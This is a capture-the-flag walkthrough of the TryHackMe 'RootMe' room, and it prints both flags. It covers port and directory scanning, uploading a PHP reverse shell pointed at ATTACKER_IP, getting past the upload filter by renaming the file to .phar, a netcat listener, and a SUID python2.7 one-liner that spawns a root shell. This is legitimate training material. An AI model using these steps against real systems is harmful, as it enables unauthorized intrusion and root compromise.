

# RootMe

Room: [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)

## Reconnaissance

First, I performed a port scan using **Nmap** to identify open services on the target machine.

```bash
nmap -sC -sV 10.48.153.117 -oN nmap_output.txt
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

The scan revealed two open ports:

* **22/tcp** — SSH
* **80/tcp** — HTTP (Apache Web Server)

Since a web server was running on port **80**, I began enumerating the web application.


# Web Enumeration

I visited the website and used **Wappalyzer** to identify technologies used by the server.

The server was running:

* **Apache 2.4.41**

Next, I performed directory brute-forcing using **Gobuster**.

```bash
gobuster dir -u http://10.48.153.117/ -w /usr/share/wordlists/dirb/common.txt
```

This revealed a hidden directory:

```
/panel
```

Navigating to:

```
http://10.48.153.117/panel/
```

I found a **file upload form**.

---

# Exploitation

Since the application allowed file uploads, I attempted to upload a **PHP reverse shell**.

I used the **PentestMonkey PHP reverse shell**, which is included in Kali Linux:

```
/usr/share/webshells/php/php-reverse-shell.php
```

Before uploading the file, I modified the following values:

```
$ip = ATTACKER_IP
$port = 1234
```

However, when I tried uploading the file, the server returned the error:

```
PHP não é permitido!
```

This means:

```
PHP is not allowed
```

So the server was blocking files with the `.php` extension.



# Upload Filter Bypass

Many Apache configurations treat other extensions as PHP scripts, including:

```
.phar
.phtml
```

To bypass the upload restriction, I simply renamed the file:

```
shell.php → shell.phar
```

I uploaded the file again and this time the upload **succeeded**.

---

# Reverse Shell

Before executing the shell, I started a listener on my machine:

```bash
nc -lvnp 1234
```

Then I navigated to the uploads directory:

```
http://10.48.153.117/uploads/
```

The uploaded file was present there.

When I accessed:

```
/uploads/shell.phar
```

the payload executed and a **reverse shell connected back to my listener**.

---

# User Flag

After gaining shell access, I searched for the user flag.

```bash
find / -type f -name user.txt 2>/dev/null
```

I found it in:

```
/var/www/user.txt
```

So to view the contents of user.txt:

```bash
cd /var/www
cat user.txt
```

User flag:

```
THM{y0u_g0t_a_sh3ll}
```


# Privilege Escalation

Next, I looked for **SUID binaries**.

SUID (**Set User ID**) is a special permission that allows a program to run with the **file owner's privileges (often root)** instead of the user executing it.

To find SUID files, I ran:

```bash
find / -perm -4000 2>/dev/null
```

Among the results, I found an unusual binary:

```
/usr/bin/python2.7
```


# Root Shell

Since Python was running with **SUID permissions**, it could be used to spawn a root shell.

I executed:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

This successfully spawned a **root shell**.


# Root Flag

After gaining root access, I navigated to the root directory.

```bash
cd /root
ls
cat root.txt
```

Root flag:

```
THM{pr1v1l3g3_3sc4l4t10n}
```
